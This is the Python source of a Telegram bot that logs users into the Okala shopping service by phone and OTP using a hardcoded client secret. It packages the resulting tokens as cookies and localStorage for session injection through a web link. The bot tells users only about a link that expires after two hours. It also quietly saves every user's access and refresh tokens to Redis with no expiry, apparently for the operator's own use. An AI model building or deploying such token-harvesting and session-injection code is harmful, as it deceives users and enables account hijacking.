import os
import json
import logging
import asyncio
import uuid
import urllib.parse
import time
import requests
# تغییر مهم: استفاده از نسخه Async ردیس
import redis.asyncio as redis 
from concurrent.futures import ThreadPoolExecutor
from aiohttp import web
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

REDIS_URL = os.environ.get("REDIS_URL", "redis://localhost:6379")
# اتصال به صورت Async
redis_client = redis.Redis.from_url(REDIS_URL, decode_responses=True)

WEB_DOMAIN = os.environ.get("WEB_DOMAIN", "http://localhost:8080")
PHONE, OTP, ASK_NAME = range(3)
executor = ThreadPoolExecutor(max_workers=10)

BASE_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
    "Origin": "https://www.okala.com",
    "Referer": "https://www.okala.com/"
}

# ==========================================
# بخش تبدیل دیتای خام
# ==========================================
def format_for_injector(auth_data):
    access_token = auth_data.get("access_token", "")
    refresh_token = auth_data.get("refresh_token", "")
    user_info = auth_data.get("UserInfo", {})
    
    user_dict = {
        "id": user_info.get("Id", 0),
        "alternativeId": user_info.get("AlternativeId", ""),
        "alternativeCustomerId": user_info.get("AlternativeCustomerId", 0),
        "firstName": user_info.get("FirstName", ""),
        "lastName": user_info.get("LastName", ""),
        "birthDate": "",
        "genderCode": user_info.get("GenderCode", 1),
        "emailAddress": user_info.get("EmailAddress", ""),
        "userName": user_info.get("UserName", ""),
        "mobilePhone": user_info.get("MobilePhone", ""),
        "stateCode": user_info.get("StateCode", 1),
        "customerIsLoggedInForFirstTime": user_info.get("CustomerIsLoggedInForFirstTime", False),
        "firstLoginDateTime": user_info.get("FirstLoginDateTime", ""),
        "state": user_info.get("State", False),
        "hasAddress": user_info.get("HasAddress", False),
        "birthDateEpoch": user_info.get("BirthDateEpoch", 0)
    }
    
    user_json_str = json.dumps(user_dict, ensure_ascii=False)
    user_url_encoded = urllib.parse.quote(user_json_str)
    
    persist_user_inner = user_dict.copy()
    persist_user_inner["token"] = access_token
    
    persist_root_dict = {
        "user": json.dumps({"user": persist_user_inner, "discountCode": None}, ensure_ascii=False),
        "cart": json.dumps({"cartData": [], "totalCartsCount": 0, "showDrawer": False, "cartTotalPrice": 0}),
        "mapInfo": json.dumps({
            "defaultViewPort": {"latitude": 35.69976, "longitude": 51.33808, "id": 129, "name": "تهران"},
            "viewport": {"latitude": 35.69976, "longitude": 51.33808},
            "discovery": {}, "searchCity": "", "searchLocation": "", "filteredCities": [],
            "searchLocationResult": [], "selectedCity": {"id": 129, "name": "تهران", "lat": 35.69975, "lng": 51.33551},
            "mapCityName": "تهران", "showSearchCityResult": False, "showSearchLocationResult": False,
            "mapIsTouched": False, "eventStartTime": 0, "eventStartTimeForEditAddress": 0,
            "zoomMeasure": 15, "mapPlatform": "ParsiMap"
        }, ensure_ascii=False),
        "wallet": json.dumps({"selectedPriceState": None}),
        "route": json.dumps({"fromRoute": "", "data": None}),
        "eventData": json.dumps({"isLoggedIn": True, "platform": "web", "viewedLayersCount": 0, "activeDiscountCodesCount": 0, "sessionLayersViewedCount": 0}),
        "_persist": json.dumps({"version": -1, "rehydrated": True})
    }
    
    persist_root_str = json.dumps(persist_root_dict, ensure_ascii=False)
    expire_time = int(time.time()) + 31536000 
    
    return {
        "cookies": [
            {"name": "refresh_token", "value": refresh_token, "domain": ".okala.com", "path": "/", "expires": expire_time, "httpOnly": True, "secure": True, "sameSite": "None"},
            {"name": "tokenMS", "value": access_token, "domain": "www.okala.com", "path": "/", "expires": expire_time, "httpOnly": False, "secure": False, "sameSite": "Lax"},
            {"name": "token", "value": access_token, "domain": "www.okala.com", "path": "/", "expires": expire_time, "httpOnly": False, "secure": False, "sameSite": "Lax"},
            {"name": "user", "value": user_url_encoded, "domain": "www.okala.com", "path": "/", "expires": -1, "httpOnly": False, "secure": False, "sameSite": "Lax"}
        ],
        "origins": [
            {
                "origin": "https://www.okala.com",
                "localStorage": [
                    {"name": "tokenMS", "value": access_token},
                    {"name": "user", "value": user_url_encoded},
                    {"name": "city_name", "value": "تهران"},
                    {"name": "city_id", "value": "129"},
                    {"name": "persist:root", "value": persist_root_str}
                ]
            }
        ]
    }

# ==========================================
# بخش مینی‌سرور وب (Async)
# ==========================================
async def web_handler_get_account(request):
    link_id = request.match_info.get('link_id', '')
    # دریافت اطلاعات از ردیس به صورت Async
    data = await redis_client.get(f"acc_link:{link_id}")
    if data:
        return web.json_response(json.loads(data))
    return web.json_response({"error": "لینک نامعتبر است یا منقضی شده."}, status=404)

async def start_web_server():
    app = web.Application()
    app.router.add_get('/acc/{link_id}', web_handler_get_account)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080)) 
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"🌐 Web server running on port {port}")

# ==========================================
# بخش ربات تلگرام
# ==========================================
async def async_request(method, url, **kwargs):
    loop = asyncio.get_running_loop()
    if method.upper() == 'POST': return await loop.run_in_executor(executor, lambda: requests.post(url, **kwargs))
    return await loop.run_in_executor(executor, lambda: requests.get(url, **kwargs))

def get_user_headers(context: ContextTypes.DEFAULT_TYPE):
    if 'device_id' not in context.user_data:
        context.user_data['device_id'] = str(uuid.uuid4())
        context.user_data['session_id'] = str(uuid.uuid4())
    headers = BASE_HEADERS.copy()
    headers['X-User-Unique-Id'] = context.user_data['device_id']
    headers['session-id'] = context.user_data['session_id']
    return headers

async def save_account_to_db_async(phone, access_token, refresh_token):
    try:
        await redis_client.hset(f"account:{phone}", mapping={"access_token": access_token, "refresh_token": refresh_token})
    except Exception as e:
        logging.error(f"Redis Error: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("📞 لطفاً شماره موبایل خود را برای ورود به اکالا وارد کنید:")
    return PHONE

async def request_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    phone = update.message.text.strip()
    context.user_data['phone'] = phone

    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/OTPRegister"
    payload = {"mobile": phone, "deviceTypeCode": 7, "confirmTerms": True, "notRobot": False, "otpType": 0, "ValidationCodeCreateReason": 5, "OtpApp": 0, "IsAppOnly": False}

    response = await async_request('POST', url, json=payload, headers=get_user_headers(context), timeout=15)
    if response.status_code == 200:
        await update.message.reply_text("✅ کد تایید پیامک شد. لطفاً آن را ارسال کنید:")
        return OTP
    else:
        await update.message.reply_text(f"❌ خطا در ارسال کد: {response.status_code}")
        return ConversationHandler.END

async def verify_otp_and_check_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    otp_code = update.message.text.strip()
    phone = context.user_data.get('phone')
    msg = await update.message.reply_text("⏳ در حال احراز هویت...")

    token_url = "https://apigateway.okala.com/api/v1/accounts/tokens"
    payload = {"mobile_number": phone, "otp_code": otp_code, "grant_type": "customer_grant_type", "client_id": "customer_client_id", "client_secret": "u_M{'57j!%LI21#", "client_name": "customer_client_name", "device_type_code": 7, "scope": "offline_access", "loginDuration": 4815}
    
    headers = get_user_headers(context)
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    response = await async_request('POST', token_url, data=payload, headers=headers)
    if response.status_code == 200:
        auth_data = response.json()
        context.user_data['auth_data'] = auth_data 
        
        if auth_data.get("access_token"):
            await save_account_to_db_async(phone, auth_data.get("access_token"), auth_data.get("refresh_token"))

        if not auth_data.get("UserInfo", {}).get("HasName", False):
            await msg.edit_text("⚠️ حساب فاقد نام است. نام و نام خانوادگی را وارد کنید:")
            return ASK_NAME
        else:
            return await generate_and_send_link(update, context, msg)
    else:
        await msg.edit_text("❌ کد اشتباه است یا منقضی شده. مجدداً /start کنید.")
        return ConversationHandler.END

async def save_name_and_continue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    full_name = update.message.text.strip()
    if not full_name: return ASK_NAME

    parts = full_name.split(maxsplit=1)
    msg = await update.message.reply_text("⏳ در حال ثبت اطلاعات هویتی...")
    
    url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/UpdateCustomer" 
    headers = get_user_headers(context)
    headers["Authorization"] = f"Bearer {context.user_data['auth_data'].get('access_token')}"
    
    payload = {"birthDate": "", "birthDateEpoch": 700086600, "customerType": 0, "firstName": parts[0], "genderCode": 1, "genderTitle": "مذکر", "lastName": parts[1] if len(parts)>1 else "", "gender": "male"}
    
    await async_request('POST', url, json=payload, headers=headers)
    
    context.user_data['auth_data']['UserInfo']['FirstName'] = parts[0]
    if len(parts) > 1: context.user_data['auth_data']['UserInfo']['LastName'] = parts[1]

    return await generate_and_send_link(update, context, msg)

async def generate_and_send_link(update: Update, context: ContextTypes.DEFAULT_TYPE, status_msg) -> int:
    auth_data = context.user_data.get('auth_data')
    injection_json = format_for_injector(auth_data)
    
    link_id = str(uuid.uuid4())[:12]
    
    # ذخیره لینک در ردیس به صورت Async
    await redis_client.setex(f"acc_link:{link_id}", 7200, json.dumps(injection_json, ensure_ascii=False))
    
    final_url = f"{WEB_DOMAIN}/acc/{link_id}"
    
    success_text = (
        "✅ <b>لاگین با موفقیت انجام شد!</b>\n\n"
        "لینک اکانت شما ساخته شد. این لینک را کپی کرده و مستقیماً داخل اپلیکیشن قرار دهید:\n\n"
        f"<code>{final_url}</code>\n\n"
        "<i>(🔒 توجه: این لینک به دلایل امنیتی فقط تا ۲ ساعت آینده معتبر است)</i>"
    )
    
    # تغییر به فرمت امن HTML
    await status_msg.edit_text(success_text, parse_mode='HTML')
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text("عملیات لغو شد.")
    return ConversationHandler.END

# ==========================================
# بخش راه‌اندازی اصلی
# ==========================================
async def main():
    # بررسی اتصال ردیس در ابتدای برنامه
    try:
        await redis_client.ping()
        logging.info("✅ Successfully connected to Redis!")
    except Exception as e:
        logging.error(f"❌ Failed to connect to Redis: {e}")

    BOT_TOKEN = os.environ.get("BOT_TOKEN")
    if not BOT_TOKEN:
        logging.error("❌ BOT_TOKEN is not set!")
        return

    await start_web_server()

    application = Application.builder().token(BOT_TOKEN).build()
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, request_otp)],
            OTP: [MessageHandler(filters.TEXT & ~filters.COMMAND, verify_otp_and_check_name)],
            ASK_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, save_name_and_continue)],
        },
        fallbacks=[CommandHandler('cancel', cancel)]
    )
    application.add_handler(conv_handler)
    
    await application.initialize()
    await application.start()
    await application.updater.start_polling()
    
    logging.info("🚀 Telegram Bot and Web Server are running...")
    
    stop_signal = asyncio.Event()
    await stop_signal.wait()

if __name__ == '__main__':
    # استفاده از متد استاندارد برای جلوگیری از کرش در Railway
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
